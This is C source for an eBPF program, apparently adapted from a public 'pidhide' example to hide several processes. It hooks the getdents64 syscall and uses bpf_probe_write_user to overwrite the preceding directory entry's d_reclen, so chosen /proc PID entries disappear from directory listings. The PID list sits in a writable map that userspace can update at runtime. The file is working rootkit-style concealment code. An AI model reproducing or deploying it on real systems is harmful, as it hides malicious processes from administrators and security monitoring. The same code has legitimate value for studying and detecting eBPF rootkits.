// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */
/* Modified to support multiple PIDs */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// RingBuffer to send events to um
struct {
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map to hold program tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

#define MAX_PID_LEN 10

// PIDs to hide, keyed by their fixed-size, zero-padded string form (the
// same bytes handle_getdents_exit() reads from d_name) - a writable hash
// map instead of load-time rodata, so userspace can add/remove entries
// while running (see pidhide.c's periodic re-resolution of -n NAME
// entries, which need this to survive a process respawning with a new
// PID). Explicit -p PID entries live here too, just never refreshed.
//
// IMPORTANT: hash map keys are compared byte-for-byte across the entire
// fixed key size, not just the meaningful prefix - unlike the old
// per-entry length-bounded comparison this replaces, every byte of the
// key matters here. bpf_probe_read_user_str() does NOT zero-pad bytes
// after the copied string (unlike e.g. strncpy) - the destination buffer
// must be explicitly zeroed first, or trailing stack garbage would make
// the same PID hash to different keys across calls and silently never
// match. See the matching memset on the userspace insert side in
// pidhide.c - both sides must use the exact same convention.
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, char[MAX_PID_LEN]);
    __type(value, __u8);
} pids_to_hide_map SEC(".maps");

#if NOGITSUNE_DEBUG
#define log_bpf(fmt, ...) bpf_printk(fmt, ##__VA_ARGS__)
#else
#define log_bpf(fmt, ...)
#endif

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }
    
    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    for (int i = 0; i < 200; i++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        /* Explicit zero-fill before the read: bpf_probe_read_user_str()
         * does not pad bytes after the copied string, so without this the
         * trailing bytes would be leftover stack garbage from a previous,
         * possibly-longer filename - making the same PID hash to a
         * different key on different iterations and never match. */
        __builtin_memset(&filename, 0, sizeof(filename));
        bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);

        // Check if this filename matches any PID we want to hide
        if (bpf_map_lookup_elem(&pids_to_hide_map, filename)) {
            // Found a matching PID folder
            // Save position AFTER this entry so we continue from there after patching
            unsigned int next_pos = bpos + d_reclen;
            bpf_map_update_elem(&map_bytes_read, &pid_tgid, &next_pos, BPF_ANY);
            // map_to_patch already has the previous entry (set in last iteration)
            // Jump to patch routine - it will tail call back to us
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        
        // Save this entry as "previous" for potential patching
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If there's still more to read, continue in next tail call
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }
    
    // Done scanning - cleanup
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);
    bpf_map_delete_elem(&map_to_patch, &pid_tgid);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found a pid folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // Unlink target by reading previous linux_dirent64 struct
    // and setting its d_reclen to cover itself and our target
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, sizeof(filename), dirp_previous->d_name);
    log_bpf("[PID_HIDE] previous entry: %s\n", filename);
    bpf_probe_read_user_str(&filename, sizeof(filename), dirp->d_name);
    log_bpf("[PID_HIDE] hiding entry: %s\n", filename);

    // Overwrite d_reclen to skip over the hidden entry
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    // DON'T delete maps yet - we need to continue scanning for more PIDs
    // Update map_to_patch to point to the merged entry (dirp_previous now covers both)
    // This way if the NEXT entry also needs hiding, we have the right "previous"
    bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp_previous, BPF_ANY);
    
    // Tail call back to handle_getdents_exit to continue scanning
    // map_bytes_read was already updated to position after the hidden entry
    bpf_tail_call(ctx, &map_prog_array, PROG_01);
    
    // If tail call fails (shouldn't happen), cleanup
    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);
    
    return 0;
}